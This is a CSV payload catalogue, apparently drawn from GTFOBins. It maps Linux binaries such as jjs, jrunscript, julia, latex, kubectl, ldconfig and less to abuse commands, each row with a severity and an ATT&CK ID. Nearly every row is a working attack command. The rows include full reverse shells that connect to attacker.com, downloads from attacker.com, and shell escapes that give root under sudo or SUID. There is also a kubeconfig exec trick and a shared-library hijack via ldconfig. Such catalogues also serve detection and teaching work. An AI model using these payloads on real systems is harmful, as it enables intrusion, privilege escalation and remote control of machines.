789,Linux,"jjs var URL = Java.type('java.net.URL'); var ws = new URL('http://attacker.com/path/to/input-file'); var Channels = Java.type('java.nio.channels.Channels'); var rbc = Channels.newChannel(ws.openStream()); var FileOutputStream = Java.type('java.io.FileOutputStream'); var fos = new FileOutputStream('/path/to/output-file'); fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE); fos.close(); rbc.close();",Abuse the 'jjs' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/jjs/
790,Linux,jjs var BufferedReader = Java.type('java.io.BufferedReader'); var FileReader = Java.type('java.io.FileReader'); var br = new BufferedReader(new FileReader('/path/to/input-file')); while ((line = br.readLine()) != null) { print(line); },Abuse the 'jjs' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/jjs/
791,Linux,jjs var BufferedReader = Java.type('java.io.BufferedReader'); var FileReader = Java.type('java.io.FileReader'); var br = new BufferedReader(new FileReader('/path/to/input-file')); while ((line = br.readLine()) != null) { print(line); },Abuse the 'jjs' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/jjs/
792,Linux,jjs var FileWriter = Java.type('java.io.FileWriter'); var fw=new FileWriter('/path/to/output-file'); fw.write('DATA'); fw.close();,Abuse the 'jjs' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/jjs/
793,Linux,jjs var FileWriter = Java.type('java.io.FileWriter'); var fw=new FileWriter('/path/to/output-file'); fw.write('DATA'); fw.close();,Abuse the 'jjs' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/jjs/
794,Linux,"jjs var host='attacker.com'; var port=12345; var ProcessBuilder = Java.type('java.lang.ProcessBuilder'); var p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start(); var Socket = Java.type('java.net.Socket'); var s=new Socket(host,port); var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();",Abuse the 'jjs' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/jjs/
795,Linux,"jjs var host='attacker.com'; var port=12345; var ProcessBuilder = Java.type('java.lang.ProcessBuilder'); var p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start(); var Socket = Java.type('java.net.Socket'); var s=new Socket(host,port); var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();",Abuse the 'jjs' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/jjs/
796,Linux,jjs Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor(),Abuse the 'jjs' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/jjs/
797,Linux,jjs Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor(),Abuse the 'jjs' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/jjs/
798,Linux,joe ^K!/bin/sh,Abuse the 'joe' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The terminal is spawn int the terminal interface.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/joe/
799,Linux,joe ^K!/bin/sh,Abuse the 'joe' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. The terminal is spawn int the terminal interface.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/joe/
800,Linux,joe ^K!/bin/sh,Abuse the 'joe' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The terminal is spawn int the terminal interface.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/joe/
801,Linux,join -a 2 /dev/null /path/to/input-file,Abuse the 'join' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/join/
802,Linux,join -a 2 /dev/null /path/to/input-file,Abuse the 'join' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/join/
803,Linux,join -a 2 /dev/null /path/to/input-file,Abuse the 'join' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/join/
804,Linux,journalctl,Abuse the 'journalctl' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/journalctl/
805,Linux,journalctl,Abuse the 'journalctl' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/journalctl/
806,Linux,jq -Rr . /path/to/input-file,Abuse the 'jq' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/jq/
807,Linux,jq -Rr . /path/to/input-file,Abuse the 'jq' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/jq/
808,Linux,jq -Rr . /path/to/input-file,Abuse the 'jq' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/jq/
809,Linux,"jrunscript -e 'cp(""http://attacker.com/path/to/input-file"",""/path/to/output-file"")'",Abuse the 'jrunscript' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/jrunscript/
810,Linux,"jrunscript -e 'cp(""http://attacker.com/path/to/input-file"",""/path/to/output-file"")'",Abuse the 'jrunscript' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/jrunscript/
811,Linux,"jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""/path/to/input-file"")); while ((line = br.readLine()) != null) { print(line); }'",Abuse the 'jrunscript' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/jrunscript/
812,Linux,"jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""/path/to/input-file"")); while ((line = br.readLine()) != null) { print(line); }'",Abuse the 'jrunscript' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/jrunscript/
813,Linux,"jrunscript -e 'var fw=new java.io.FileWriter(""/path/to/output-file""); fw.write(""DATA""); fw.close();'",Abuse the 'jrunscript' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/jrunscript/
814,Linux,"jrunscript -e 'var fw=new java.io.FileWriter(""/path/to/output-file""); fw.write(""DATA""); fw.close();'",Abuse the 'jrunscript' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/jrunscript/
815,Linux,"jrunscript -e 'var host=""attacker.com""; var port=12345; var p=new java.lang.ProcessBuilder(""/bin/sh"", ""-i"").redirectErrorStream(true).start(); var s=new java.net.Socket(host,port); var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); java.lang.Thread.sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'",Abuse the 'jrunscript' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/jrunscript/
816,Linux,"jrunscript -e 'var host=""attacker.com""; var port=12345; var p=new java.lang.ProcessBuilder(""/bin/sh"", ""-i"").redirectErrorStream(true).start(); var s=new java.net.Socket(host,port); var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); java.lang.Thread.sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'",Abuse the 'jrunscript' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/jrunscript/
817,Linux,"jrunscript -e 'exec(""/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty"")'",Abuse the 'jrunscript' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/jrunscript/
818,Linux,"jrunscript -e 'exec(""/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty"")'",Abuse the 'jrunscript' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/jrunscript/
819,Linux,"jrunscript -e 'exec(""/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty"")'",Abuse the 'jrunscript' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/jrunscript/
820,Linux,jshell jshell> /open /path/to/input-file,Abuse the 'jshell' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The content is leaked as error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/jshell/
821,Linux,jshell jshell> /open /path/to/input-file,Abuse the 'jshell' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The content is leaked as error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/jshell/
822,Linux,"jshell String x = ""DATA""; /save /path/to/output-file",Abuse the 'jshell' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Writes only the valid Java code to file.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/jshell/
823,Linux,"jshell String x = ""DATA""; /save /path/to/output-file",Abuse the 'jshell' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Writes only the valid Java code to file.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/jshell/
824,Linux,"jshell Runtime.getRuntime().exec(""/path/to/command"");",Abuse the 'jshell' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/jshell/
825,Linux,"jshell Runtime.getRuntime().exec(""/path/to/command"");",Abuse the 'jshell' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/jshell/
826,Linux,jtag --interactive shell /bin/sh,Abuse the 'jtag' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/jtag/
827,Linux,jtag --interactive shell /bin/sh,Abuse the 'jtag' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/jtag/
828,Linux,"julia -e 'download(""http://attacker.com/path/to/input-file"", ""/path/to/output-file"")'",Abuse the 'julia' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/julia/
829,Linux,"julia -e 'download(""http://attacker.com/path/to/input-file"", ""/path/to/output-file"")'",Abuse the 'julia' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/julia/
830,Linux,"julia -e 'download(""http://attacker.com/path/to/input-file"", ""/path/to/output-file"")'",Abuse the 'julia' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/julia/
831,Linux,"julia -e 'print(open(f->read(f, String), ""/path/to/input-file""))'",Abuse the 'julia' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/julia/
832,Linux,"julia -e 'print(open(f->read(f, String), ""/path/to/input-file""))'",Abuse the 'julia' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/julia/
833,Linux,"julia -e 'print(open(f->read(f, String), ""/path/to/input-file""))'",Abuse the 'julia' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/julia/
834,Linux,"julia -e 'open(f->write(f, ""DATA""), /path/to/output-file, ""w"")'",Abuse the 'julia' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/julia/
835,Linux,"julia -e 'open(f->write(f, ""DATA""), /path/to/output-file, ""w"")'",Abuse the 'julia' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/julia/
836,Linux,"julia -e 'open(f->write(f, ""DATA""), /path/to/output-file, ""w"")'",Abuse the 'julia' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/julia/
837,Linux,"julia -e 'using Sockets; sock=connect(""attacker.com"", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'",Abuse the 'julia' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/julia/
838,Linux,"julia -e 'using Sockets; sock=connect(""attacker.com"", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'",Abuse the 'julia' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/julia/
839,Linux,"julia -e 'using Sockets; sock=connect(""attacker.com"", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'",Abuse the 'julia' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/julia/
840,Linux,julia -e 'run(`/bin/sh`)',Abuse the 'julia' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/julia/
841,Linux,julia -e 'run(`/bin/sh -p`)',Abuse the 'julia' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/julia/
842,Linux,julia -e 'run(`/bin/sh`)',Abuse the 'julia' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/julia/
843,Linux,knife exec -E '...',Abuse the 'knife' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Ruby code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/knife/
844,Linux,knife exec -E '...',Abuse the 'knife' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Ruby code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/knife/
845,Linux,ksshell -i /path/to/input-file,Abuse the 'ksshell' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ksshell/
846,Linux,ksshell -i /path/to/input-file,Abuse the 'ksshell' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ksshell/
847,Linux,ksshell -i /path/to/input-file,Abuse the 'ksshell' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ksshell/
848,Linux,ksu -q -e /bin/sh,Abuse the 'ksu' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ksu/
849,Linux,cat >/path/to/temp-file <<EOF clusters: - cluster: server: https://x name: x contexts: - context: cluster: x user: x name: x current-context: x users: - name: x user: exec: apiVersion: client.authentication.k8s.io/v1 interactiveMode: Always command: /bin/sh args: - '-c' - '/bin/sh 0<&2 1>&2' EOF kubectl get pods --kubeconfig=/path/to/temp-file,Abuse the 'kubectl' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The shell is spawn multiple times.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/kubectl/
850,Linux,cat >/path/to/temp-file <<EOF clusters: - cluster: server: https://x name: x contexts: - context: cluster: x user: x name: x current-context: x users: - name: x user: exec: apiVersion: client.authentication.k8s.io/v1 interactiveMode: Always command: /bin/sh args: - '-c' - '/bin/sh 0<&2 1>&2' EOF kubectl get pods --kubeconfig=/path/to/temp-file,Abuse the 'kubectl' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The shell is spawn multiple times.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/kubectl/
851,Linux,kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/,Abuse the 'kubectl' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/kubectl/
852,Linux,kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/,Abuse the 'kubectl' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/kubectl/
853,Linux,kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/,Abuse the 'kubectl' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/kubectl/
854,Linux,last -a -f /path/to/input-file,Abuse the 'last' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The output might be corrupted or incomplete if the file does not follow the expected database format.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/last/
855,Linux,last -a -f /path/to/input-file,Abuse the 'last' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The output might be corrupted or incomplete if the file does not follow the expected database format.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/last/
856,Linux,last -a -f /path/to/input-file,Abuse the 'last' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The output might be corrupted or incomplete if the file does not follow the expected database format.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/last/
857,Linux,latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' strings texput.dvi,Abuse the 'latex' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file will be part of the PDF output.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/latex/
858,Linux,latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' strings texput.dvi,Abuse the 'latex' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The read file will be part of the PDF output.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/latex/
859,Linux,latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' strings texput.dvi,Abuse the 'latex' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file will be part of the PDF output.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/latex/
860,Linux,latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}',"Abuse the 'latex' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The file can only be written in the current directory, and the `.tex` extension is mandatory.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/latex/
861,Linux,latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}',"Abuse the 'latex' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The file can only be written in the current directory, and the `.tex` extension is mandatory.",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/latex/
862,Linux,latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}',"Abuse the 'latex' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The file can only be written in the current directory, and the `.tex` extension is mandatory.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/latex/
863,Linux,latex --shell-escape '\immediate\write18{/bin/sh}',Abuse the 'latex' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/latex/
864,Linux,latex --shell-escape '\immediate\write18{/bin/sh}',Abuse the 'latex' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/latex/
865,Linux,latex --shell-escape '\immediate\write18{/bin/sh}',Abuse the 'latex' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/latex/
866,Linux,echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file latexmk -dvi /path/to/temp-file strings temp-file.dvi,Abuse the 'latexmk' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file will be part of the output.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/latexmk/
867,Linux,echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file latexmk -dvi /path/to/temp-file strings temp-file.dvi,Abuse the 'latexmk' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file will be part of the output.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/latexmk/
868,Linux,latexmk -e '...',Abuse the 'latexmk' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Perl code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/latexmk/
869,Linux,latexmk -e '...',Abuse the 'latexmk' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Perl code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/latexmk/
870,Linux,latexmk -pdf -pdflatex='/bin/sh #' /dev/null,Abuse the 'latexmk' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/latexmk/
871,Linux,latexmk -pdf -pdflatex='/bin/sh #' /dev/null,Abuse the 'latexmk' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/latexmk/
872,Linux,/path/to/ld.so /bin/sh,"Abuse the 'ld.so' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The spawned process will be the loader, not the target executable, this might aid evasion. See <https://shyft.us/posts/20230526_linux_command_proxy.html> for more information.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ld.so/
873,Linux,/path/to/ld.so /bin/sh -p,"Abuse the 'ld.so' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. The spawned process will be the loader, not the target executable, this might aid evasion. See <https://shyft.us/posts/20230526_linux_command_proxy.html> for more information.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ld.so/
874,Linux,/path/to/ld.so /bin/sh,"Abuse the 'ld.so' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The spawned process will be the loader, not the target executable, this might aid evasion. See <https://shyft.us/posts/20230526_linux_command_proxy.html> for more information.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ld.so/
875,Linux,echo /path/to/temp-dir/ >/path/to/temp-file ldconfig -f /path/to/temp-file ping,"Abuse the 'ldconfig' binary (library load) in a sudo context to escalate privileges or execute arbitrary actions. This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system. First identify the shared libraries used by the target program, for example: ``` $ ldd /bin/ping | grep libcap libcap.so.2 => /path/to/temp-dir/libcap.so.2 (0x00007f8417eef000) ``` Then create the shared library override, named `libcap.so.2`, and put in in `/path/to/temp-dir/`. The program might require some exported symbols from the library override, in that case make sure to add them (e.g., `void cap_get_flag() {}`).",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ldconfig/
876,Linux,echo /path/to/temp-dir/ >/path/to/temp-file ldconfig -f /path/to/temp-file ping,"Abuse the 'ldconfig' binary (library load) in a suid context to escalate privileges or execute arbitrary actions. This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system. First identify the shared libraries used by the target program, for example: ``` $ ldd /bin/ping | grep libcap libcap.so.2 => /path/to/temp-dir/libcap.so.2 (0x00007f8417eef000) ``` Then create the shared library override, named `libcap.so.2`, and put in in `/path/to/temp-dir/`. The program might require some exported symbols from the library override, in that case make sure to add them (e.g., `void cap_get_flag() {}`).",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/ldconfig/
877,Linux,echo /path/to/temp-dir/ >/path/to/temp-file ldconfig -f /path/to/temp-file ping,"Abuse the 'ldconfig' binary (library load) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system. First identify the shared libraries used by the target program, for example: ``` $ ldd /bin/ping | grep libcap libcap.so.2 => /path/to/temp-dir/libcap.so.2 (0x00007f8417eef000) ``` Then create the shared library override, named `libcap.so.2`, and put in in `/path/to/temp-dir/`. The program might require some exported symbols from the library override, in that case make sure to add them (e.g., `void cap_get_flag() {}`).",Library Load Hijack,Medium,T1574.006,https://gtfobins.github.io/gtfobins/ldconfig/
878,Linux,cp /path/to/command ~/.lessfilter less /etc/hosts,Abuse the 'less' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/less/
879,Linux,LESSOPEN='/path/to/command # %s' less /etc/hosts,Abuse the 'less' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/less/
880,Linux,LESSOPEN='/path/to/command # %s' less /etc/hosts,Abuse the 'less' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/less/
